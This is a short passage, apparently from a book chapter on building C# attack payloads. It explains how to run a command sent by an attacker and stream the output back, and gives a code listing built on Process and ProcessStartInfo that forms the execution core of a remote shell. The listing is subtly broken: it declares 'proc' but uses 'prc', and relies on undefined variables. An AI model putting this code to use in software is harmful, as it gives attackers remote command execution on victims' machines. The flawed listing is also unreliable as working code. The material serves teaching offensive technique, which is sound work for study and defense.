  md: '# Running the Command


    Now we need to run the command and return the output to the attacker. As shown
    in Listing 4-4, we use the Process and ProcessStartInfo classes to set up and
    run the command and write the output back to the attacker.


    ```

    try {

    Process proc = new Process();

    prc.StartInfo = new ProcessStartInfo();

    prc.StartInfo.FileName = filename;

    prc.StartInfo.Arguments = arg;

    prc.StartInfo.UseShellExecute = false;

    prc.StartInfo.RedirectStandardOutput = true;

    prc.Start();

    prc.StandardOutput.BaseStream.CopyTo(stream);

    prc.WaitForExit();

    } catch {

    error = "Error running command " + cmd + "\n";

    byte[] errorBytes = Encoding.ASCII.GetBytes(error);

    stream.Write(errorBytes, 0, errorBytes.Length);

    }

    ```


